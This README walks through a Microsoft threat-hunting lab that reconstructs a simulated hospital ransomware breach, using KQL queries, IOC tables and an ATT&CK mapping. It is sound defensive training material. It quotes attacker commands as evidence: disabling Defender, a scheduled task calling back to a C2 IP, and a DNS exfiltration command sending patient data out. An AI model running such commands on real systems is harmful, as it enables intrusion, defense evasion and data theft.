# Into the Breach: Threat Hunting Walkthrough

A full investigation walkthrough of the **Microsoft Security Immersion Workshop: Into the Breach**. This repo documents a hospital ransomware incident reconstructed end to end inside **Microsoft Defender XDR**, **Microsoft Sentinel**, and **Advanced Hunting (KQL)**.

The format mirrors a real SOC investigation. Each phase pairs the analyst question with the hunting logic, the KQL used, the evidence found, and the MITRE ATT&CK mapping.

---

## Scenario

A United Veterans Medical Health System hospital was hit by a human-operated ransomware attack on **June 15, 2026**. Employees reported encrypted files. The IT team found anomalous outbound connections and unknown files. The hospital's MSSP was compromised and used as a launch point.

Environment: Microsoft 365 E5, most devices onboarded to Defender XDR.

Goal: identify indicators of compromise, scope the impact, and contain further attacker activity.

The malware family is **Sodinokibi / REvil**, delivered through a supply-chain style path that mirrors the Kaseya VSA attack.

---

## Attack at a Glance

The investigation ran backward from impact to initial access, then forward again to build the full picture.

```
External phish (maxdefense.com)
        |
        v
   jroader  (mailbox compromised)
        |  internal spearphish "Knee Rehab Video"
        v
   sbeavers (target)
        |
        v
   rehab-6  (initial foothold, macro -> PowerShell -> pneumaEX C2)
        |  RDP brute force (hydra) + WMI
        v
 floor-5-adm (Defender disabled, Mimikatz, persistence)
        |  pivot
        v
   dc01  (SharpHound, schtasks persistence, ransomware staging)
        |  remote push from MSSP host NMIS (192.168.0.100)
        v
 Environment-wide REvil deployment
```

Parallel objective: patient data exfiltration over DNS tunneling to the attacker C2.

---

## Key Indicators of Compromise

| Type | Indicator |
|------|-----------|
| External sender | systems@maxdefense.com |
| Compromised mailbox | jroader@uvmhealth2.onmicrosoft.com |
| Malicious attachment | nmis_connectivity.doc |
| Attachment SHA256 | aab936e7336b77ba16e048a12a38eaa96684e2b3464e14bf218866771db938a5 |
| Callback malware | pneumaEX-windows.exe |
| Credential dumper | Mimikatz |
| AD enumeration | SharpHound (Invoke-BloodHound -CollectionMethod All) |
| Brute force tool | hydra.exe |
| Ransomware DLL | mpsvc.dll |
| Ransomware DLL SHA256 | 8dd620d9aeb35960bb766458c8890ede987c33d239cf730f93fe49d90ae759dd |
| Side-load host binary | msmpeng.exe (renamed Microsoft Defender binary) |
| Exfil tool | dnsExfiltrator.exe |
| Exfil archive | UVMHealth_Data.zip |
| Exfil source share | Z:\UVMHealth_Data\Records |
| C2 server | 40.76.11.104:2323 |
| Staging / second attacker IP | 20.163.213.224 |
| Staging hostname | uvmoutpost.eastus.cloudapp.azure.com (ports 8080, 3391) |
| Persistence task | Microsoft\Windows\Network Controller\Network Controller Manager |
| MSSP launch host | NMIS (192.168.0.100) |

---

## Compromised Assets

**Endpoints with successful ransomware execution:** floor-5-adm, rehab-6, rehab-8

**Endpoints in lateral movement path:** rehab-6 -> floor-5-adm -> dc01

**Compromised domain accounts:** jroader, sbeavers, uvmadmin

---

# Investigation Walkthrough

## Milestone 2: Impact

### Objective: where did ransomware execute successfully

The trap: Attack Disruption prevented remote encryption on 8 of 8 targeted devices. "Saved" is not the same as "executed successfully." The answer is the hosts where a Sodinokibi alert read **detected and was active**, not blocked or prevented.

```kusto
AlertInfo
| where Timestamp between (datetime(2026-06-15) .. datetime(2026-06-17))
| where Title has "Sodinokibi" and Title has "active"
| join kind=inner AlertEvidence on AlertId
| where isnotempty(DeviceName)
| distinct DeviceName, Title
```

**Answer:** floor-5-adm, rehab-6, rehab-8

### Objective: ransomware shared library

REvil uses DLL side-loading. A renamed legitimate binary loads the malicious DLL. Searching the file name for "sodinokibi" returns nothing because the on-disk name is generic.

```kusto
DeviceImageLoadEvents
| where Timestamp between (datetime(2026-06-15) .. datetime(2026-06-17))
| where FileName endswith ".dll"
| where InitiatingProcessFileName !in~ ("svchost.exe","services.exe")
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName, SHA256
| sort by Timestamp asc
```

`mpsvc.dll` dropped to `C:\Windows\Temp\` and side-loaded by `msmpeng.exe`.

**Answer:** mpsvc.dll

### Objective: unique endpoints where PowerShell downloaded the ransomware

```kusto
DeviceFileEvents
| where Timestamp between (datetime(2026-06-15) .. datetime(2026-06-17))
| where FileName =~ "mpsvc.dll"
| where InitiatingProcessFileName =~ "powershell.exe"
| summarize dcount(DeviceName)
```

Five hosts: dc01, floor-5-adm, picu-1, rehab-8, rehab-6. The earlier `MpSvc.dll` drops by `updateplatform.exe` are a different hash and are excluded.

**Answer:** 5

### Objective: internal host that pushed the ransomware

```kusto
DeviceLogonEvents
| where Timestamp between (datetime(2026-06-15) .. datetime(2026-06-17))
| where LogonType == "Network"
| summarize Hosts=dcount(DeviceName), Targets=make_set(DeviceName) by RemoteIP
| sort by Hosts desc
```

`192.168.0.100` issued remote commands to 9 hosts. The Network Map resolves it to **NMIS**, the MSSP Management server.

**Answer:** NMIS

---

## Milestone 3: Lateral Movement 1 (Domain Controller)

### Objective: AD enumeration tool

```kusto
DeviceProcessEvents
| where Timestamp between (datetime(2026-06-15) .. datetime(2026-06-17))
| where ProcessCommandLine has_any ("sharphound","Invoke-BloodHound","-collectionmethod")
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
```

Three-stage evidence on dc01: download of `SharpHound.ps1`, `Invoke-BloodHound -CollectionMethod All`, and output `20260615183916_BloodHound.zip`. SharpHound is the collector; BloodHound is the analysis tool.

**Answer:** SharpHound

### Objective: persistence admin tool

```kusto
DeviceProcessEvents
| where DeviceName has "dc01"
| where FileName in~ ("schtasks.exe","sc.exe","reg.exe")
| where ProcessCommandLine has "create"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName
```

```
schtasks.exe /F /create /sc minute /mo 5 /tr
"C:\Windows\System32\windowspowershell\ITtestscript.exe -name dc01 -address 40.76.11.104:2323"
/tn "Microsoft\Windows\Network Controller\Network Controller Manager" /ru SYSTEM /rl HIGHEST
```

**Answer:** schtasks.exe

### Objective: scheduled task name

The task masquerades under a real Microsoft folder path.

**Answer:** Network Controller Manager

### Objective: callback IP

The implant connects to the listener on a port chosen to blend in.

**Answer:** 40.76.11.104

---

## Milestone 4: Lateral Movement 2 (the middle box)

### Objective: same task on another host

```kusto
DeviceProcessEvents
| where FileName =~ "schtasks.exe"
| where ProcessCommandLine has "Network Controller Manager"
| where DeviceName !has "dc01"
| project Timestamp, DeviceName, ProcessCommandLine
```

Same task name, same C2, different binary (`svchost.exe` running as `sbeavers`) on floor-5-adm at 1:55 PM, 35 minutes before the DC task.

**Answer:** floor-5-adm

### Objective: remote execution protocol

```kusto
DeviceProcessEvents
| where DeviceName has "floor-5-adm"
| where InitiatingProcessFileName in~ ("wmiprvse.exe","wsmprovhost.exe","psexesvc.exe")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName
```

Every malicious command was spawned by `wmiprvse.exe` with `\\127.0.0.1\ADMIN$` output redirection, the wmiexec fingerprint.

**Answer:** WMI

### Objective: persistence executable after first lateral move

The attacker downloaded `pneumaEX-windows.exe` and saved it as a fake `svchost.exe` in `C:\Windows\System32\com\`, then ran it as the persistence task.

**Answer:** svchost.exe

### Objective: hash dumping tool

LSASS credential theft on floor-5-adm. Confirmed in the incident graph and Defender alerts ("Mimikatz credential theft tool").

**Answer:** Mimikatz

### Objective: how the credential harvester ran on a protected endpoint

Before dropping tools, the attacker impaired defenses over WMI:

```
mpcmdrun.exe -RemoveDefinitions -All
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -ExclusionPath C:\Windows\Temp\
```

**Answer:** Disabled Microsoft Defender real-time protection (removed definitions, added an exclusion path). MITRE T1562.001.

### Objective: credential access tactic detected by Sentinel

```kusto
AlertInfo
| where Category =~ "CredentialAccess"
| where ServiceSource has "Sentinel"
| project Timestamp, Title, Category, ServiceSource
```

Alert "Remote Authentication Brute Force - RDP" at 1:51 PM.

**Answer:** Brute Force

### Objective: brute force source IP

The success IP and the attack IP differ. The brute force is the burst of failed logons.

```kusto
DeviceLogonEvents
| where DeviceName has "floor-5-adm"
| where ActionType == "LogonFailed"
| summarize Attempts=count(), First=min(Timestamp), Last=max(Timestamp) by RemoteIP, AccountName
| sort by Attempts desc
```

40 failed logons in 3 seconds from `172.16.40.5` (rehab-6).

**Answer:** 172.16.40.5

---

## Milestone 5: Initial Access

### Objective: compromised mailbox used for internal phishing

```kusto
EmailEvents
| where SenderFromDomain has "uvmhealth2" and RecipientEmailAddress has "uvmhealth2"
| where ThreatTypes has "Phish" or ThreatTypes has "Malware"
| project Timestamp, SenderFromAddress, RecipientEmailAddress, Subject, ThreatTypes, AttachmentCount
```

`jroader` sent "Knee Rehab Video" with a malware attachment to `sbeavers` at 1:48 PM.

**Answer:** jroader@uvmhealth2.onmicrosoft.com

### Objective: external sender that compromised jroader

```kusto
EmailEvents
| where RecipientEmailAddress has "jroader"
| where SenderFromDomain !has "uvmhealth2"
| where UrlCount > 0 or AttachmentCount > 0
| project Timestamp, SenderFromAddress, Subject, ThreatTypes, AttachmentCount, DeliveryAction
```

`systems@maxdefense.com`, subject "Please research added cost from your system," at 1:32 PM.

**Answer:** systems@maxdefense.com

### Objective: malicious attachment

```kusto
EmailAttachmentInfo
| where ThreatTypes has "Malware"
| project Timestamp, SenderFromAddress, RecipientEmailAddress, FileName, FileType, SHA256
```

`nmis_connectivity.doc`, blasted to 8 users. The name matches the `/nmis_maldoc/` stager path.

**Answer:** nmis_connectivity.doc

### Objective: executable dropped by the Word macro chain

The full chain:

```
winword.exe
  -> powershell (mshta stager.hta)
    -> mshta.exe
      -> powershell iex (stager.ps1)
        -> drops C:\Windows\Temp\pneumaEX-windows.exe
          -> pneumaEX-windows.exe -name rehab-6 -address 40.76.11.104:2323
```

```kusto
DeviceFileEvents
| where DeviceName has "rehab-6"
| where FileName endswith ".exe"
| where InitiatingProcessFileName =~ "powershell.exe"
| project Timestamp, FileName, FolderPath, InitiatingProcessCommandLine
```

**Answer:** pneumaEX-windows.exe

### Objective: exfiltrated archive

The attacker copied `Z:\UVMHealth_Data\Records`, zipped it, and tunneled it out over DNS:

```
dnsExfiltrator.exe C:\Windows\Temp\UVMHealth_Data.zip uvmhealth2.onmicrosoft.com 3xf1l s=40.76.11.104
```

**Answer:** UVMHealth_Data.zip

---

## Milestone 6: Full Scope

| Objective | Answer |
|-----------|--------|
| Initial access technique | Phishing (Spearphishing Attachment, T1566.001) |
| Other phishing recipients | mvalorel, mperro, cjones, emuirgo, sbeavers, reldo, bberg |
| Lateral movement from rehab-6 | floor-5-adm, dc01 |
| Three compromised domain accounts | jroader, sbeavers, uvmadmin |
| Technique NOT used | User Creation |
| Two attacker IPs | 40.76.11.104, 20.163.213.224 |
| Most prevalent recommendation component | Security controls (Attack Surface Reduction) |
| Action center user actions | Contain user, Disable user |

### Vulnerability management: most prevalent component

Exported from Defender Vulnerability Management security recommendations, counted by related component:

| Related component | Recommendations |
|-------------------|-----------------|
| Security controls (Attack Surface Reduction) | 17 |
| OS | 14 |
| Network | 14 |
| Security controls (Antivirus) | 7 |
| Security controls (Firewall) | 5 |
| Accounts | 5 |

ASR leads. It directly counters the observed techniques: blocking Office from spawning child processes, blocking script-launched executables, and blocking LSASS credential theft.

---

# MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|-----|----------|
| Initial Access | Spearphishing Attachment | T1566.001 | nmis_connectivity.doc from maxdefense.com |
| Execution | Malicious Macro / PowerShell | T1059.001, T1204.002 | winword -> powershell -> mshta |
| Execution | Windows Management Instrumentation | T1047 | wmiprvse, wmic /node |
| Persistence | Scheduled Task | T1053.005 | Network Controller Manager task |
| Defense Evasion | Impair Defenses: Disable Tools | T1562.001 | Set-MpPreference, RemoveDefinitions |
| Defense Evasion | Masquerading | T1036 | fake svchost.exe, msmpeng.exe |
| Defense Evasion | DLL Side-Loading | T1574.002 | mpsvc.dll via msmpeng.exe |
| Credential Access | OS Credential Dumping: LSASS | T1003.001 | Mimikatz |
| Credential Access | Brute Force | T1110 | hydra RDP, Sentinel alert |
| Discovery | Domain Account / Trust Discovery | T1087, T1482 | SharpHound, net accounts |
| Lateral Movement | Remote Services: RDP | T1021.001 | brute force into floor-5-adm |
| Lateral Movement | Remote Services: WMI | T1021 | remote command execution |
| Collection | Data from Network Shares | T1039 | Z:\UVMHealth_Data\Records |
| Exfiltration | Exfiltration Over DNS | T1048, T1071.004 | dnsExfiltrator.exe |
| Command and Control | Application Layer Protocol | T1071 | pneumaEX callback to 40.76.11.104:2323 |
| Impact | Data Encrypted for Impact | T1486 | REvil / Sodinokibi, mpsvc.dll |
| Impact | Financial Theft / Extortion | T1657 | PII exfil for double extortion |

---

# Detection and Hunting Lessons

**1. Read the disruption summary carefully.** "Devices saved" and "ransomware executed successfully" are different. Alert status (active vs prevented) is the discriminator, not the alert name.

**2. Detection name does not equal file name.** Sodinokibi never writes a file called "sodinokibi." Hunt the alert tables (AlertInfo, AlertEvidence) and the side-loaded DLL, not the string.

**3. Source IP is not always the success IP.** Brute force lives in the failed-logon burst. Separate `LogonFailed` from `LogonSuccess` before answering "where did the attack come from."

**4. wmiprvse.exe as a parent is a tell.** Remote WMI execution leaves a clear `ADMIN$` redirect fingerprint. Pivot on the initiating process, not the payload.

**5. Living-off-the-land hides in plain sight.** schtasks, wmic, net, reg, mshta, and PowerShell were the attacker's whole toolkit. Behavioral context, not binary reputation, surfaces them.

**6. Tie identity to action, not activity count.** High logon counts are normal user noise. Map accounts to attacker behavior and to the incident's contained-accounts list.

---

# Recommended Hardening

Mapped to what would have broken this specific chain:

- **Attack Surface Reduction rules.** Block Office child processes, block script-launched executables, block credential theft from LSASS. Highest-leverage control for this attack.
- **Tamper Protection.** Prevents `Set-MpPreference` and `RemoveDefinitions` from disabling AV.
- **Onboard every endpoint to Defender for Endpoint.** Initial access succeeded on an unprotected host.
- **Phishing-resistant MFA and conditional access.** Limits the value of brute-forced or phished credentials.
- **Network segmentation and RDP restriction.** Block internal RDP brute force paths between clinical subnets.
- **DNS monitoring and egress filtering.** Detect tunneling exfiltration to unknown domains.
- **Tiered admin model and LAPS.** Contain credential reuse from a workstation to the domain controller.
- **MSSP and supply-chain access review.** The launch host was a trusted management server. Audit and constrain MSSP standing access.

---

# Repository Structure

```
into-the-breach/
├── README.md                  (this walkthrough)
├── queries/                   (KQL used per phase)
├── iocs/                      (machine-readable IOC lists)
└── mitre/                     (ATT&CK navigator layer)
```

---

*Educational walkthrough of the Microsoft Security Immersion Workshop: Into the Breach. All hostnames, accounts, and indicators belong to the simulated lab environment.*
